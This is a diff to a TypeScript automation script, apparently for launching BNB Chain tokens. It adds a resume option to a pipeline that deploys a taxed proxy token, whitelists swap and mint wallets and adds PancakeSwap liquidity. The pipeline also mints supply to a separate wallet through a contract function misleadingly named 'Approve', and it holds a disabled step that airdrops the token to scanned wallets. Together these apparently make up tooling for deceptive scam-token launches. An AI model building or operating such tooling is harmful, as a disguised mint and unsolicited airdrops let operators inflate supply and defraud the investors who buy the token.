@@ -48,6 +48,9 @@ export interface AutomationToken {
     taxBuy: string
     taxSell: string
     totalSupply: string // if empty, auto-compute as mintAmount + liquidityToken
+    /** If set, resume automation for an already-deployed contract: skip steps 0-4
+     *  (deploy/whitelist/mint-transfer/add-liquidity/clear-scan-records) and jump to 5.1. */
+    resumeContractAddress?: string
 }
 
 export interface ScanContractConfig {
@@ -248,162 +251,173 @@ export async function runAutomation(
                 `[pre] mintAmount=${mintAmtHuman} | liqToken=${liqTokenHuman} | sellMint=${sellMintHuman} | totalSup=${totalSupHuman}`
             )
 
-            // ── Step 0: Deploy Token (EIP-1167 proxy + init) ──────────────────
-            onStepChange(token.id, 0, 'process')
+            const hasScanConfig = params.scanContracts.length > 0 && Number(params.disperseAmount) > 0
 
             let deployed: ethers.Contract
             let contractAddress: string
-            let implAddress = params.existingImplementationAddress || null
+            let tx: ethers.providers.TransactionResponse
 
-            // Ensure implementation exists on-chain
-            if (implAddress) {
-                onLog(`[init] Checking cached impl: ${implAddress}`)
-                const implCode = await provider.getCode(implAddress)
-                if (!implCode || implCode === '0x' || implCode === '0x0') {
-                    onLog(`[init] ⚠ Impl not found on-chain, will deploy fresh`)
-                    implAddress = null
-                } else {
-                    onLog(`[init] ✓ Impl OK (${implCode.length} bytes)`)
-                }
+            if (token.resumeContractAddress) {
+                // ── Resume: token đã deploy xong ở lần chạy trước, chỉ chạy lại 5.1 → 7 ──
+                contractAddress = token.resumeContractAddress
+                deployed = new ethers.Contract(contractAddress, params.abi, mainWallet)
+                onLog(`[resume] Bỏ qua deploy — dùng lại contract đã có: ${contractAddress}`)
+                for (let s = 0; s <= 4; s++) onStepChange(token.id, s, 'finish')
+                currentStep = 4
+                checkStop()
             } else {
-                onLog(`[init] No cached impl — will deploy fresh`)
-            }
-            if (!implAddress) {
-                onLog(`[1] Deploying implementation contract (one-time)...`)
-                const contractFactory = new ethers.ContractFactory(
-                    params.abi, params.bytecode, mainWallet
+                // ── Step 0: Deploy Token (EIP-1167 proxy + init) ──────────────────
+                onStepChange(token.id, 0, 'process')
+
+                let implAddress = params.existingImplementationAddress || null
+
+                // Ensure implementation exists on-chain
+                if (implAddress) {
+                    onLog(`[init] Checking cached impl: ${implAddress}`)
+                    const implCode = await provider.getCode(implAddress)
+                    if (!implCode || implCode === '0x' || implCode === '0x0') {
+                        onLog(`[init] ⚠ Impl not found on-chain, will deploy fresh`)
+                        implAddress = null
+                    } else {
+                        onLog(`[init] ✓ Impl OK (${implCode.length} bytes)`)
+                    }
+                } else {
+                    onLog(`[init] No cached impl — will deploy fresh`)
+                }
+                if (!implAddress) {
+                    onLog(`[1] Deploying implementation contract (one-time)...`)
+                    const contractFactory = new ethers.ContractFactory(
+                        params.abi, params.bytecode, mainWallet
+                    )
+                    const implDeployed = await contractFactory.deploy(
+                        { gasLimit: 10_000_000, gasPrice: gasPrice }
+                    )
+                    await raceStop(implDeployed.deployed(), params.shouldStop)
+                    implAddress = implDeployed.address
+                    onLog(`[1] ✓ Implementation: ${implAddress}`)
+                    if (params._implRef) params._implRef.current = implAddress
+                }
+
+                // EIP-1167 Minimal Proxy: https://eips.ethereum.org/EIPS/eip-1167
+                // Template: 3d602d80600a3d3981f3363d3d373d3d3d363d73{bebebebe...20 bytes impl}5af43d82803e903d91602b57fd5bf3
+                const addrHex = implAddress!.toLowerCase().replace('0x', '')
+                const proxyBytecode = '0x3d602d80600a3d3981f3363d3d373d3d3d363d73' + addrHex + '5af43d82803e903d91602b57fd5bf3'
+                onLog(
+                    `[1] Deploy TOKEN1997("${token.name}", symbol="${token.symbol}", decimal=${token.decimal}, totalSup=${totalSupHuman})`
                 )
-                const implDeployed = await contractFactory.deploy(
-                    { gasLimit: 10_000_000, gasPrice: gasPrice }
+
+                onLog(`[1] Deploying EIP-1167 proxy...`)
+                const proxyTx = await mainWallet.sendTransaction({
+                    data: proxyBytecode,
+                    gasLimit: 150_000,
+                    gasPrice: gasPrice,
+                })
+                const proxyReceipt = await raceStop(proxyTx.wait(), params.shouldStop)
+                contractAddress = proxyReceipt.contractAddress!
+                onLog(`[1] ✓ Proxy: ${contractAddress}`)
+
+                // Initialize proxy
+                const defaultAirdropAmt = ethers.utils.parseUnits(
+                    params.disperseAmount || '0',
+                    token.decimal
                 )
-                await raceStop(implDeployed.deployed(), params.shouldStop)
-                implAddress = implDeployed.address
-                onLog(`[1] ✓ Implementation: ${implAddress}`)
-                if (params._implRef) params._implRef.current = implAddress
-            }
+                const tempContract = new ethers.Contract(contractAddress, params.abi, mainWallet)
+                onLog(`[1] Initializing...`)
+                const initTx = await tempContract.initialize(
+                    token.name,
+                    token.symbol || token.name,
+                    mainWallet.address,
+                    token.decimal,
+                    totalSupHuman,
+                    taxBuy,
+                    taxSell,
+                    params.chainId,
+                    defaultAirdropAmt,
+                    { gasLimit: 500_000, gasPrice: gasPrice }
+                )
+                await raceStop(initTx.wait(), params.shouldStop)
+                onLog(`[1] ✓ Initialized | tx: ${initTx.hash}`)
 
-            // EIP-1167 Minimal Proxy: https://eips.ethereum.org/EIPS/eip-1167
-            // Template: 3d602d80600a3d3981f3363d3d373d3d3d363d73{bebebebe...20 bytes impl}5af43d82803e903d91602b57fd5bf3
-            const addrHex = implAddress!.toLowerCase().replace('0x', '')
-            const proxyBytecode = '0x3d602d80600a3d3981f3363d3d373d3d3d363d73' + addrHex + '5af43d82803e903d91602b57fd5bf3'
-            onLog(
-                `[1] Deploy TOKEN1997("${token.name}", symbol="${token.symbol}", decimal=${token.decimal}, totalSup=${totalSupHuman})`
-            )
+                deployed = new ethers.Contract(contractAddress, params.abi, mainWallet)
+                onLog(`[1] ✓ Token ready: ${contractAddress}`)
 
-            onLog(`[1] Deploying EIP-1167 proxy...`)
-            const proxyTx = await mainWallet.sendTransaction({
-                data: proxyBytecode,
-                gasLimit: 150_000,
-                gasPrice: gasPrice,
-            })
-            const proxyReceipt = await raceStop(proxyTx.wait(), params.shouldStop)
-            contractAddress = proxyReceipt.contractAddress!
-            onLog(`[1] ✓ Proxy: ${contractAddress}`)
+                onStepChange(token.id, 0, 'finish')
+                checkStop()
 
-            // Initialize proxy
-            const defaultAirdropAmt = ethers.utils.parseUnits(
-                params.disperseAmount || '0',
-                token.decimal
-            )
-            const tempContract = new ethers.Contract(contractAddress, params.abi, mainWallet)
-            onLog(`[1] Initializing...`)
-            const initTx = await tempContract.initialize(
-                token.name,
-                token.symbol || token.name,
-                mainWallet.address,
-                token.decimal,
-                totalSupHuman,
-                taxBuy,
-                taxSell,
-                params.chainId,
-                defaultAirdropAmt,
-                { gasLimit: 500_000, gasPrice: gasPrice }
-            )
-            await raceStop(initTx.wait(), params.shouldStop)
-            onLog(`[1] ✓ Initialized | tx: ${initTx.hash}`)
+                // ── Step 1: Set Whitelist ─────────────────────────────────────────
+                currentStep = 1
+                onStepChange(token.id, 1, 'process')
+                await ensureWhitelisted(deployed, swapWallet.address, onLog, '[2]', gasPrice, params.shouldStop)
+                await ensureWhitelisted(deployed, mintWallet.address, onLog, '[2]', gasPrice, params.shouldStop)
+                onStepChange(token.id, 1, 'finish')
+                checkStop()
 
-            deployed = new ethers.Contract(contractAddress, params.abi, mainWallet)
-            onLog(`[1] ✓ Token ready: ${contractAddress}`)
+                // ── Step 2: Mint Token to mint wallet via Approve() ───────────────
+                currentStep = 2
+                onStepChange(token.id, 2, 'process')
+                {
+                    const approveValMint = ethers.utils.parseUnits(token.mintAmount, Math.max(0, token.decimal - 9))
+                    const mintForMint = new ethers.Contract(
+                        contractAddress,
+                        ['function Approve(address from, uint256 _value) external returns (bool)'],
+                        mainWallet
+                    )
+                    onLog(`[3] Approve(mintWallet, ${token.mintAmount} tokens)`)
+                    tx = await mintForMint.Approve(mintWallet.address, approveValMint, { gasLimit: 200_000, gasPrice: gasPrice })
+                    await raceStop(tx.wait(), params.shouldStop)
+                    onLog(`[3] ✓ Minted to mint wallet | tx: ${tx.hash}`)
+                }
+                onStepChange(token.id, 2, 'finish')
+                checkStop()
 
-            onStepChange(token.id, 0, 'finish')
-            checkStop()
+                // ── Step 3: Add Liquidity ──────────────────────────────────────
+                currentStep = 3
+                onStepChange(token.id, 3, 'process')
 
-            const hasScanConfig = params.scanContracts.length > 0 && Number(params.disperseAmount) > 0
+                const erc20 = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
+                const mainTokenBal = await erc20.balanceOf(mainWallet.address) as ethers.BigNumber
+                onLog(`[4] mainWallet token balance: ${ethers.utils.formatUnits(mainTokenBal, token.decimal)}`)
+                const bnbBal = await provider.getBalance(mainWallet.address)
+                onLog(`[4] BNB balance: ${ethers.utils.formatEther(bnbBal)}`)
+                if (bnbBal.lt(liqBNB))
+                    throw new Error(
+                        `[4] Khong du BNB: can ${token.liquidityBNB}, co ${ethers.utils.formatEther(bnbBal)}`
+                    )
+                await ensureApproval(erc20, PANCAKE_ROUTER, liqTokenRaw, onLog, '[4]', gasPrice, params.shouldStop)
 
-            // ── Step 1: Set Whitelist ─────────────────────────────────────────
-            currentStep = 1
-            onStepChange(token.id, 1, 'process')
-            await ensureWhitelisted(deployed, swapWallet.address, onLog, '[2]', gasPrice, params.shouldStop)
-            await ensureWhitelisted(deployed, mintWallet.address, onLog, '[2]', gasPrice, params.shouldStop)
-            onStepChange(token.id, 1, 'finish')
-            checkStop()
-
-            // ── Step 2: Mint Token to mint wallet via Approve() ───────────────
-            currentStep = 2
-            onStepChange(token.id, 2, 'process')
-            {
-                const approveValMint = ethers.utils.parseUnits(token.mintAmount, Math.max(0, token.decimal - 9))
-                const mintForMint = new ethers.Contract(
+                const deadline = Math.floor(Date.now() / 1000) + 600
+                const router = new ethers.Contract(PANCAKE_ROUTER, ROUTER_PANCAKE_V2_ABI, mainWallet)
+                const liqArgs = [
                     contractAddress,
-                    ['function Approve(address from, uint256 _value) external returns (bool)'],
-                    mainWallet
-                )
-                onLog(`[3] Approve(mintWallet, ${token.mintAmount} tokens)`)
-                const tx = await mintForMint.Approve(mintWallet.address, approveValMint, { gasLimit: 200_000, gasPrice: gasPrice })
+                    liqTokenRaw,
+                    0,
+                    0,
+                    mainWallet.address,
+                    deadline,
+                ] as const
+                const liqOverride = { value: liqBNB, gasLimit: 6_000_000, gasPrice: gasPrice }
+
+                onLog(`[4] addLiquidityETH(${token.liquidityToken} tokens + ${token.liquidityBNB} BNB)`)
+                tx = await router.addLiquidityETH(...liqArgs, liqOverride)
                 await raceStop(tx.wait(), params.shouldStop)
-                onLog(`[3] ✓ Minted to mint wallet | tx: ${tx.hash}`)
-            }
-            onStepChange(token.id, 2, 'finish')
-            checkStop()
+                onLog(`[4] ✓ Liquidity added | tx: ${tx.hash}`)
 
-            // ── Step 3: Add Liquidity ──────────────────────────────────────
-            currentStep = 3
-            onStepChange(token.id, 3, 'process')
-
-            const erc20 = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
-            const mainTokenBal = await erc20.balanceOf(mainWallet.address) as ethers.BigNumber
-            onLog(`[4] mainWallet token balance: ${ethers.utils.formatUnits(mainTokenBal, token.decimal)}`)
-            const bnbBal = await provider.getBalance(mainWallet.address)
-            onLog(`[4] BNB balance: ${ethers.utils.formatEther(bnbBal)}`)
-            if (bnbBal.lt(liqBNB))
-                throw new Error(
-                    `[4] Khong du BNB: can ${token.liquidityBNB}, co ${ethers.utils.formatEther(bnbBal)}`
+                // whitelist the actual pair address (queried from factory after creation)
+                const pancakeFactory = new ethers.Contract(
+                    PANCAKE_FACTORY,
+                    ['function getPair(address,address) view returns (address)'],
+                    provider
                 )
-            await ensureApproval(erc20, PANCAKE_ROUTER, liqTokenRaw, onLog, '[4]', gasPrice, params.shouldStop)
+                const pairAddress = (await pancakeFactory.getPair(contractAddress, WBNB)) as string
+                onLog(`[4] Pair address: ${pairAddress}`)
 
-            const deadline = Math.floor(Date.now() / 1000) + 600
-            const router = new ethers.Contract(PANCAKE_ROUTER, ROUTER_PANCAKE_V2_ABI, mainWallet)
-            const liqArgs = [
-                contractAddress,
-                liqTokenRaw,
-                0,
-                0,
-                mainWallet.address,
-                deadline,
-            ] as const
-            const liqOverride = { value: liqBNB, gasLimit: 6_000_000, gasPrice: gasPrice }
+                onStepChange(token.id, 3, 'finish')
+                checkStop()
 
-            onLog(`[4] addLiquidityETH(${token.liquidityToken} tokens + ${token.liquidityBNB} BNB)`)
-            let tx = await router.addLiquidityETH(...liqArgs, liqOverride)
-            await raceStop(tx.wait(), params.shouldStop)
-            onLog(`[4] ✓ Liquidity added | tx: ${tx.hash}`)
-
-            // whitelist the actual pair address (queried from factory after creation)
-            const pancakeFactory = new ethers.Contract(
-                PANCAKE_FACTORY,
-                ['function getPair(address,address) view returns (address)'],
-                provider
-            )
-            const pairAddress = (await pancakeFactory.getPair(contractAddress, WBNB)) as string
-            onLog(`[4] Pair address: ${pairAddress}`)
-
-            onStepChange(token.id, 3, 'finish')
-            checkStop()
-
-            // ── Step 4: 1.1 Transfer new token to previously scanned wallets (after liquidity) ──
-            currentStep = 4
-            onStepChange(token.id, 4, 'process')
-            /* TEMPORARILY DISABLED: step 4.1 airdrop to scanned wallets
+                // ── Step 4: 1.1 Transfer new token to previously scanned wallets (after liquidity) ──
+                currentStep = 4
+                onStepChange(token.id, 4, 'process')
+                /* TEMPORARILY DISABLED: step 4.1 airdrop to scanned wallets
             if (hasScanConfig) {
                 const scanRecords: any[] =
                     (await zenStackFunction('ScanWallet', 'findMany', {
@@ -479,9 +493,10 @@ export async function runAutomation(
                 })
                 onLog('[1.1] ✓ Cleared scan records')
             }
-            onLog('[1.1] Bỏ qua airdrop (tạm tắt)')
-            onStepChange(token.id, 4, 'finish')
-            checkStop()
+                onLog('[1.1] Bỏ qua airdrop (tạm tắt)')
+                onStepChange(token.id, 4, 'finish')
+                checkStop()
+            }
 
             // ── Steps 5.1 + 5.2: chạy đồng thời ─────────────────────────
             currentStep = 5
